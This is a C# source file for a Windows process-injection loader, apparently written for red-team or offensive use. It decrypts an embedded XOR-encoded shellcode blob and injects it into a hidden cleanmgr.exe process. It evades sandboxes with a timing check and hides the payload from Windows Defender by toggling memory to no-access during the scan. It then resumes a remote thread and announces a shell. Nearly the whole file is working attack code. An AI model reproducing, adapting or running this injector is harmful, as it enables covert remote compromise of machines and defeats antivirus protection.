
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.IO;

namespace RTSProcessInjection
{
    class Program
    {
        public const uint PAGE_EXECUTE_READ_WRITE = 0x40;
        public const uint PAGE_NO_ACCESS = 0x01;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpshellcodefer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        //https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        public static extern void Sleep(uint dwMilliseconds);

        private static byte[] xor(byte[] cipher, byte[] key)
        {
            byte[] xored = new byte[cipher.Length];

            for (int i = 0; i < cipher.Length; i++)
            {
                xored[i] = (byte)(cipher[i] ^ key[i % key.Length]);
            }

            return xored;
        }

        static void Main(string[] args)
        {
            Console.WriteLine("[+] Delay of three seconds for scan bypass check");

            DateTime time1 = DateTime.Now;
            Sleep(3000);
            double time2 = DateTime.Now.Subtract(time1).TotalSeconds;
            if (time2 < 2.5)
            {
                return;
            }

            IntPtr hProcess;
            IntPtr addr = IntPtr.Zero;

            Console.WriteLine("[+] Opening cleanmgr in the background");

            Process p = new Process();
            p.StartInfo = new ProcessStartInfo("cleanmgr.exe");
            p.StartInfo.WorkingDirectory = @"C:\Windows\System32\";
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.Start();


            int pid = Process.GetProcessesByName("cleanmgr")[0].Id;

            Console.WriteLine("[+] OpenProcess with PID {0}.", new string[] { pid.ToString() });

            hProcess = OpenProcess(0x001F0FFF, false, pid);


			string key = "MROBOTX";

            byte[] xorshellcode = new byte[511] { 0xb1, 0x1a, 0xcc, 0xa6, 0xbf, 0xbc, 0x94, 0x4d, 0x52, 0x4f, 0x03, 0x1e, 0x15, 0x08, 0x1f, 0x03, 0x07, 0x73, 0x9d, 0x31, 0x10, 0xc6, 0x00, 0x2f, 0x0a, 0xc4, 0x06, 0x40, 0x1b, 0x1a, 0xc4, 0x10, 0x6f, 0x1c, 0x57, 0xfa, 0x18, 0x05, 0x0a, 0xc4, 0x26, 0x08, 0x00, 0x63, 0x86, 0x0a, 0x7e, 0x94, 0xf4, 0x71, 0x33, 0x33, 0x40, 0x63, 0x74, 0x19, 0x8c, 0x9b, 0x42, 0x03, 0x4e, 0x95, 0xba, 0xa0, 0x00, 0x0e, 0x13, 0x07, 0xdf, 0x0a, 0x6d, 0xd9, 0x0d, 0x7e, 0x07, 0x55, 0x88, 0x2b, 0xd3, 0x37, 0x5a, 0x44, 0x56, 0x57, 0xc8, 0x20, 0x4f, 0x42, 0x4f, 0xdf, 0xd8, 0xc5, 0x52, 0x4f, 0x42, 0x07, 0xd1, 0x98, 0x39, 0x35, 0x07, 0x43, 0x9f, 0x04, 0xd3, 0x05, 0x4a, 0x0b, 0xc9, 0x0f, 0x74, 0x11, 0x4c, 0x82, 0xac, 0x14, 0x02, 0x65, 0x91, 0x05, 0xad, 0x86, 0x03, 0xc4, 0x60, 0xd0, 0x05, 0x53, 0x99, 0x0a, 0x7e, 0x94, 0x19, 0x8c, 0x9b, 0x42, 0xee, 0x0e, 0x55, 0x99, 0x75, 0xb2, 0x3a, 0xb3, 0x03, 0x57, 0x14, 0x69, 0x5a, 0x0a, 0x7b, 0x9e, 0x21, 0x80, 0x15, 0x16, 0xc4, 0x02, 0x6b, 0x1d, 0x59, 0x9d, 0x34, 0x0e, 0xc9, 0x43, 0x1c, 0x1c, 0xc6, 0x12, 0x53, 0x0b, 0x4e, 0x84, 0x19, 0xc6, 0x56, 0xc7, 0x03, 0x17, 0x1c, 0x59, 0x9d, 0x13, 0x17, 0x1c, 0x16, 0x0e, 0x19, 0x15, 0x13, 0x16, 0x03, 0x15, 0x1c, 0xdb, 0xa1, 0x72, 0x0e, 0x10, 0xb0, 0xb4, 0x00, 0x0c, 0x0b, 0x15, 0x0a, 0xc4, 0x46, 0xb1, 0x06, 0xad, 0xb0, 0xbd, 0x12, 0x1d, 0xe6, 0x3a, 0x21, 0x7d, 0x1d, 0x7c, 0x66, 0x58, 0x4d, 0x13, 0x19, 0x0b, 0xc6, 0xb2, 0x10, 0xcc, 0xbe, 0xef, 0x43, 0x4f, 0x54, 0x11, 0xc4, 0xb7, 0x06, 0xfe, 0x4d, 0x54, 0x7f, 0x42, 0x92, 0xe7, 0x42, 0x6d, 0x15, 0x0c, 0x04, 0xdb, 0xab, 0x0e, 0xc6, 0xa5, 0x19, 0xf7, 0x1e, 0x38, 0x64, 0x48, 0xab, 0x8d, 0x01, 0xdb, 0xa5, 0x2a, 0x4e, 0x55, 0x58, 0x4d, 0x0b, 0x0e, 0xf8, 0x66, 0xd4, 0x33, 0x4d, 0xad, 0x9a, 0x28, 0x45, 0x15, 0x06, 0x1d, 0x02, 0x02, 0x73, 0x86, 0x19, 0x69, 0x8d, 0x1a, 0xb0, 0x82, 0x07, 0xdd, 0x9a, 0x05, 0xad, 0x8f, 0x0a, 0xc6, 0x95, 0x19, 0xf7, 0xb8, 0x40, 0x9d, 0xaf, 0xab, 0x8d, 0x05, 0xdb, 0x88, 0x28, 0x5f, 0x15, 0x00, 0x01, 0xdb, 0xad, 0x0a, 0xc6, 0xad, 0x19, 0xf7, 0xcb, 0xea, 0x36, 0x2e, 0xab, 0x8d, 0xc8, 0x92, 0x3b, 0x48, 0x06, 0xab, 0x96, 0x38, 0xb7, 0xa7, 0xd1, 0x4f, 0x54, 0x58, 0x05, 0xd1, 0xa3, 0x52, 0x07, 0xdd, 0xba, 0x00, 0x63, 0x86, 0x28, 0x4b, 0x15, 0x00, 0x05, 0xdb, 0xb6, 0x03, 0xf5, 0x56, 0x81, 0x85, 0x0d, 0xb0, 0x97, 0xcc, 0xac, 0x58, 0x33, 0x07, 0x07, 0xc1, 0x8b, 0x74, 0x06, 0xc4, 0xa4, 0x25, 0x02, 0x0e, 0x0d, 0x30, 0x4d, 0x42, 0x4f, 0x42, 0x0e, 0x0c, 0x10, 0xc4, 0xa0, 0x07, 0x73, 0x86, 0x15, 0xe2, 0x15, 0xf6, 0x1c, 0xa7, 0xb0, 0x81, 0x10, 0xc4, 0x91, 0x06, 0xcb, 0x88, 0x19, 0x69, 0x84, 0x1b, 0xc6, 0xb2, 0x07, 0xdd, 0x82, 0x05, 0xdb, 0xb6, 0x03, 0xf5, 0x56, 0x81, 0x85, 0x0d, 0xb0, 0x97, 0xcc, 0xac, 0x58, 0x30, 0x7a, 0x17, 0x03, 0x18, 0x0d, 0x30, 0x4d, 0x12, 0x4f, 0x42, 0x0e, 0x0c, 0x32, 0x4d, 0x08, 0x0e, 0xf8, 0x44, 0x7b, 0x57, 0x7d, 0xad, 0x9a, 0x15, 0x16, 0x15, 0xe2, 0x38, 0x3c, 0x02, 0x23, 0xb0, 0x81, 0x11, 0xb2, 0x9c, 0xa6, 0x7e, 0xb0, 0xab, 0xa7, 0x05, 0x53, 0x8c, 0x0a, 0x66, 0x92, 0x10, 0xc8, 0xa4, 0x3a, 0xf6, 0x0e, 0xab, 0xbf, 0x15, 0x38, 0x4f, 0x1b, 0xf4, 0xb4, 0x45, 0x67, 0x58, 0x0e, 0xcb, 0x95, 0xab, 0x8d };
			
			byte[] shellcode;
	
            shellcode = xor(xorshellcode, Encoding.ASCII.GetBytes(key));


            Console.WriteLine("[+] VirtualAllocEx (PAGE_EXECUTE_READ_WRITE) on 0x{0}", new string[] { hProcess.ToString("X") });
            // Sets a variable that references the memory to be allocated to the remote process
            addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, PAGE_EXECUTE_READ_WRITE);

            Console.WriteLine("[+] WriteProcessMemory to 0x{0}", new string[] { addr.ToString("X") });
            // Write shellcode to the remote process memory
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, shellcode, shellcode.Length, out outSize);

            Console.WriteLine("[+] VirtualProtectEx (PAGE_NO_ACCESS) on 0x{0}", new string[] { addr.ToString("X") });
            // Sets the memory space from EXECUTE_READ_WRITE to PAGE_NOACCESS 
            VirtualProtectEx(hProcess, addr, (UIntPtr)shellcode.Length, PAGE_NO_ACCESS, out uint lpflOldProtect);

            Console.WriteLine("[+] CreateRemoteThread (suspended) to 0x{0}", new string[] { addr.ToString("X") });
            // Create the remote thread in a suspended state
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0x00000004, out hThread);

            Console.WriteLine("[+] Sleeping as Defender scans the remote process", null);
            // Sleep for 10 seconds so Defender can scan the remote process
            System.Threading.Thread.Sleep(10000);

            Console.WriteLine("[+] VirtualProtectEx (PAGE_EXECUTE_READ_WRITE) on 0x{0}", new string[] { addr.ToString("X") });
            // Change memory protection backto PAGE_EXECUTE_READ_WRITE.
            VirtualProtectEx(hProcess, addr, (UIntPtr)shellcode.Length, PAGE_EXECUTE_READ_WRITE, out lpflOldProtect);

            Console.WriteLine("[+] Resume thread 0x{0}", new string[] { hThread.ToString("X") });
            // Resume the suspended notepad.exe thread
            ResumeThread(hThread);

            Console.WriteLine("[+] Enjoy your shell from notepad");
            //This is for debug. You can comment the below line if you do not need to read all the console messages
            System.Threading.Thread.Sleep(3000);
        }
    }
}
